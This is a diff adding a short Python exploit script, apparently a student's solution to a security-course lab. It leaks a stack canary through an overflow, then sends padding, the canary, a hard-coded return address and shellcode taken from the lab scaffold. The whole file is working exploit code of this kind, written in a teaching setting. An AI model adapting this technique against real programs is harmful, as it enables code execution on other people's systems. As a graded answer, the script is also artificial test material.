@@ -1,0 +1,23 @@
+#!/usr/bin/env python3
+
+import scaffold as p
+from scaffold import SHELLCODE
+import sys
+
+# Configure Python to print text strings like byte strings. Don't remove this!
+sys.stdout.reconfigure(encoding='latin1')
+
+### YOUR CODE STARTS HERE ###
+
+p.start()
+p.send("A" * 12 + "\\x\n")
+raw = p.recv(20)
+canary = raw[13:17]
+
+pad1 = "A" * 32
+rip = "\x90\xda\xff\xff"
+pad2 = "A" * 12
+
+p.send(pad1 + canary + pad2 + rip + SHELLCODE)
+
+### YOUR CODE ENDS HERE ###
